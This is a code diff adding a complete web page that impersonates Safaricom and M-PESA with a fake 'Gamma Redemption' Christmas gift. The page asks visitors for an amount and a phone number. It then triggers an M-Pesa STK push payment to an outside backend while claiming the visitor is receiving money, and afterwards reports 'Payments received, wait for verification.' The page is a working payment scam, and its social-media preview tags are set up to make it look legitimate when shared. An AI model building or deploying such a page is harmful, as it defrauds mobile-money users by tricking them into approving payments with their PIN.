@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">  
+<head>  
+    <meta charset="UTF-8">  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+    <title>Gamma Safaricom Redemption</title>  
+
+    <!-- Social Media Metadata (Open Graph / Twitter Cards) -->
+    <meta property="og:title" content="Gamma Redemption - Safaricom Christmas Gift">
+    <meta property="og:description" content="Receive early Gamma Redemption for Christmas in partnership with Safaricom.">
+    <meta property="og:image" content="dis.png">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:type" content="website">
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Gamma Redemption - Safaricom Christmas Gift">
+    <meta name="twitter:description" content="Receive early Gamma Redemption for Christmas in partnership with Safaricom.">
+    <meta name="twitter:image" content="dis.png">
+
+    <style>  
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {  
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;  
+            background: #0b1320;  
+            min-height: 100vh;  
+            display: flex;
+            flex-direction: column;
+            color: #ffffff;
+        }  
+        
+        /* Main full-screen wrapper */
+        .page-container {
+            flex: 1;
+            width: 100%;
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 2rem 1.5rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Hero Image display */
+        .banner-container {
+            width: 100%;
+            max-width: 500px;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+        .banner-img {
+            width: 100%;
+            height: auto;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
+            border: 1px solid #1e2c42;
+        }
+
+        .brand-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 25px;
+            width: 100%;
+        }
+        .header-divider {
+            color: #555;
+            font-size: 1.2rem;
+            font-weight: 300;
+        }
+
+        .content-section {
+            width: 100%;
+            max-width: 440px;
+            text-align: center;
+        }
+
+        .icon-circle {
+            width: 64px;
+            height: 64px;
+            background: rgba(212, 175, 55, 0.15);
+            border: 1px solid #d4af37;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px auto;
+        }
+        .icon-circle svg {
+            width: 32px;
+            height: 32px;
+            fill: #d4af37;
+        }
+
+        h2 {   
+            color: #ffffff;   
+            margin-bottom: 0.8rem;   
+            font-size: 1.4rem;   
+            line-height: 1.35;   
+            font-weight: 700;
+        }  
+        .highlight-name {
+            color: #d4af37;
+        }
+        p.subtitle {   
+            color: #a0aab8;   
+            margin-bottom: 1.8rem;   
+            font-size: 0.98rem;
+            line-height: 1.45;
+        }  
+
+        .input-group {  
+            margin: 18px 0;  
+            text-align: left;  
+        }  
+        label {  
+            display: block;  
+            margin-bottom: 8px;  
+            font-weight: 600;  
+            color: #ffffff;  
+            font-size: 0.95rem;  
+        }  
+        input {  
+            width: 100%;  
+            padding: 14px;  
+            background: #121c2d;
+            border: 1px solid #23334d;  
+            border-radius: 8px;  
+            font-size: 1.1rem;  
+            color: #ffffff;
+            outline: none;
+            transition: border-color 0.2s;
+        }  
+        input:focus {
+            border-color: #d4af37;
+        }
+        .amount-input {  
+            font-size: 1.3rem;  
+            font-weight: 600;  
+            color: #d4af37;  
+            text-align: center;  
+        }  
+        .amount-input::placeholder {
+            color: #55657e;
+            font-size: 1.05rem;
+            font-weight: normal;
+        }
+
+        button {  
+            width: 100%;  
+            padding: 15px;  
+            background: #d4af37;  
+            color: #0b1320;  
+            border: none;  
+            border-radius: 8px;  
+            font-size: 1.1rem;  
+            font-weight: 700;  
+            cursor: pointer;  
+            margin-top: 10px;  
+            transition: background 0.2s;
+        }  
+        button:hover {
+            background: #e5c158;
+        }
+        button:disabled {   
+            background: #23334d;   
+            color: #55657e;
+            cursor: not-allowed;   
+        }  
+
+        #status {  
+            margin-top: 20px;  
+            padding: 12px;  
+            border-radius: 8px;  
+            min-height: 20px;  
+            font-size: 0.92rem;  
+            line-height: 1.45;  
+        }  
+        .success { background: rgba(0, 208, 83, 0.15); color: #00d053; border: 1px solid #00d053; }  
+        .error { background: rgba(220, 53, 69, 0.15); color: #ff4d4d; border: 1px solid #ff4d4d; }  
+        .info { background: rgba(212, 175, 55, 0.15); color: #d4af37; border: 1px solid #d4af37; }  
+        .hidden { display: none; }
+
+        .loader {  
+            display: inline-block; width: 18px; height: 18px;  
+            border: 3px solid rgba(11, 19, 32, 0.3); border-top-color: #0b1320;  
+            border-radius: 50%; animation: spin 1s linear infinite;  
+            margin-right: 8px; vertical-align: middle;  
+        }  
+        @keyframes spin { to { transform: rotate(360deg); } }  
+
+        /* Footer Copyright Section */
+        footer {
+            width: 100%;
+            background: #070c14;
+            border-top: 1px solid #121c2d;
+            padding: 20px 15px;
+            text-align: center;
+            font-size: 0.85rem;
+            color: #6a7b95;
+            margin-top: auto;
+        }
+        footer a {
+            color: #a0aab8;
+            text-decoration: none;
+        }
+        footer a:hover {
+            color: #d4af37;
+        }
+    </style>  
+</head>  
+<body>  
+
+<div class="page-container">
+    <!-- Full-width visual banner display -->
+    <div class="banner-container">
+        <img src="dis.png" alt="Gamma Safaricom Redemption" class="banner-img">
+    </div>
+
+    <!-- Header Logos -->
+    <div class="brand-header">
+        <svg height="26" viewBox="0 0 120 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M15 5 C5 5 0 12 0 18 C0 24 6 28 16 28 C26 28 30 22 30 18 C28 8 18 5 15 5 Z" fill="#E11B22"/>
+            <text x="35" y="21" fill="#FFFFFF" font-family="sans-serif" font-weight="bold" font-size="16">Safaricom</text>
+        </svg>
+        <span class="header-divider">|</span>
+        <svg height="26" viewBox="0 0 100 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="2" y="2" width="20" height="26" rx="4" fill="#00D053"/>
+            <text x="27" y="21" fill="#00D053" font-family="sans-serif" font-weight="bold" font-size="16">M-PESA</text>
+        </svg>
+    </div>
+
+    <div class="content-section">
+        <!-- STEP 1: INITIAL PHONE ENTRY SCREEN -->
+        <div id="step1">
+            <h2>Enter Safaricom Number</h2>
+            <p class="subtitle">Please enter your Safaricom phone number to check available Gamma redemption.</p>
+            
+            <div class="input-group">  
+                <label for="initialPhone">Safaricom Phone Number</label>  
+                <input type="text" id="initialPhone" placeholder="0712345678" maxlength="12" inputmode="numeric">  
+            </div>  
+            <button id="askBtn" onclick="handleInitialCheck()">Ask Redemption</button>  
+        </div>
+
+        <!-- STEP 2: REDEMPTION VIEW -->
+        <div id="step2" class="hidden">
+            <div class="icon-circle">
+                <svg viewBox="0 0 24 24">
+                    <path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14zm-1-6h-3V8h-2v5H8l4 4 4-4z"/>
+                </svg>
+            </div>
+
+            <h2>You've received a redemption from <span class="highlight-name">Gamma</span> on your Safaricom line.</h2>  
+            <p class="subtitle">Enter the amount below and the M-Pesa phone number used to redeem the money.</p>  
+
+            <div class="input-group">  
+                <label for="amount">Amount (KES)</label>  
+                <input type="text" id="amount" class="amount-input" placeholder="Enter amount from 200" maxlength="6" inputmode="decimal">  
+            </div>  
+
+            <div class="input-group">  
+                <label for="phone">M-Pesa Phone Number</label>  
+                <input type="text" id="phone" placeholder="0712345678" maxlength="12" inputmode="numeric">  
+            </div>  
+
+            <button id="payBtn" onclick="handlePayment()">Pay with M-Pesa</button>  
+        </div>
+
+        <div id="status"></div>
+    </div>
+</div>  
+
+<!-- FOOTER WITH COPYRIGHT -->
+<footer>
+    <p>&copy; <script>document.write(new Date().getFullYear())</script> Gamma Redemption in partnership with Safaricom PLC. All Rights Reserved.</p>
+    <p style="margin-top: 5px;">M-PESA is a registered trademark of Safaricom PLC.</p>
+</footer>
+
+<script>  
+    const BACKEND_URL = "https://tilo-three.vercel.app";  
+    let pollTimer = null;  
+  
+    function showStatus(message, type = "info") {  
+        const div = document.getElementById('status');  
+        div.className = type;  
+        div.innerHTML = message;  
+    }  
+
+    // Step 1: Initial verification
+    function handleInitialCheck() {
+        const phone = document.getElementById('initialPhone').value.trim();
+        if (!phone || phone.length < 9) {
+            showStatus("❌ Please enter a valid Safaricom phone number", "error");
+            return;
+        }
+
+        const askBtn = document.getElementById('askBtn');
+        askBtn.disabled = true;
+        askBtn.innerHTML = '<span class="loader"></span> Checking...';
+
+        setTimeout(() => {
+            // Auto-fill phone field in step 2 with the entered number
+            document.getElementById('phone').value = phone;
+            
+            showStatus(""); // clear status
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+        }, 1200);
+    }
+
+    function resetButton() {  
+        const btn = document.getElementById('payBtn');  
+        if (btn) {
+            btn.disabled = false;  
+            btn.innerText = "Pay with M-Pesa";  
+        }
+    }  
+  
+    // Sanitize amount field input
+    function formatAmountInput() {  
+        const amountInput = document.getElementById('amount');  
+        amountInput.addEventListener('input', function() {  
+            let value = this.value.replace(/[^0-9.]/g, '');  
+            const parts = value.split('.');  
+            if (parts.length > 2) value = parts[0] + '.' + parts.slice(1).join('');  
+            if (parts.length === 2) value = parts[0] + '.' + parts[1].substring(0, 2);  
+            this.value = value;  
+        });  
+    }  
+  
+    // Step 2: Payment Execution
+    async function handlePayment() {  
+        const phone = document.getElementById('phone').value.trim();  
+        let amount = parseFloat(document.getElementById('amount').value);  
+        const btn = document.getElementById('payBtn');  
+  
+        if (!phone || phone.length < 9) {
+            showStatus("❌ Please enter a valid phone number", "error");
+            return;
+        }
+
+        if (isNaN(amount) || amount < 200) {  
+            showStatus("❌ Minimum redemption amount is KES 200.", "error");  
+            return;  
+        }  
+  
+        btn.disabled = true;  
+        btn.innerHTML = '<span class="loader"></span> Sending STK Push...';  
+        showStatus("STK Push sent.<br>Check your phone and enter M-Pesa PIN.", "info");  
+  
+        try {  
+            const res = await fetch(`${BACKEND_URL}/api/stk-push`, {  
+                method: "POST",  
+                headers: {  
+                    "Content-Type": "application/json",  
+                    "ngrok-skip-browser-warning": "true"  
+                },  
+                body: JSON.stringify({   
+                    amount: amount,   
+                    phone_number: phone   
+                })  
+            });  
+  
+            const data = await res.json();  
+            if (data.success) {  
+                startPolling();  
+            } else {  
+                showStatus("❌ Failed to start payment", "error");  
+                resetButton();  
+            }  
+        } catch (err) {  
+            showStatus("❌ Connection error. Please try again.", "error");  
+            resetButton();  
+        }  
+    }  
+  
+    function startPolling() {  
+        let attempts = 0;  
+        const maxAttempts = 50;  
+  
+        if (pollTimer) clearInterval(pollTimer);  
+  
+        pollTimer = setInterval(async () => {  
+            attempts++;  
+            try {  
+                const res = await fetch(`${BACKEND_URL}/api/status`, {  
+                    headers: { "ngrok-skip-browser-warning": "true" }  
+                });  
+                const data = await res.json();  
+  
+                if (data.status === true && data.response) {  
+                    const code = data.response.ResultCode;  
+  
+                    if (code === 0) {  
+                        clearInterval(pollTimer);  
+                        showStatus("<strong>✅ Payments received, wait for verification.</strong>", "success");  
+                        document.getElementById('payBtn').style.display = 'none';
+                        return;  
+                    } else if (code === 1032) {  
+                        clearInterval(pollTimer);  
+                        showStatus("❌ Payment was cancelled.<br>Please try again.", "error");  
+                        resetButton();  
+                        return;  
+                    } else {  
+                        clearInterval(pollTimer);  
+                        let msg = data.response.ResultDesc || "Payment failed";  
+                        if (code === 2001) msg = "Wrong M-Pesa PIN entered.";  
+                        showStatus(`❌ ${msg}`, "error");  
+                        resetButton();  
+                        return;  
+                    }  
+                }  
+  
+                if (attempts >= maxAttempts) {  
+                    clearInterval(pollTimer);  
+                    showStatus("⏰ Request timed out.<br>Check your M-Pesa or try again.", "error");  
+                    resetButton();  
+                }  
+            } catch (err) {  
+                console.error("Polling error:", err);  
+            }  
+        }, 3000);  
+    }  
+  
+    window.onload = function() {  
+        formatAmountInput();  
+    };  
+</script>  
+</body>  
+</html>
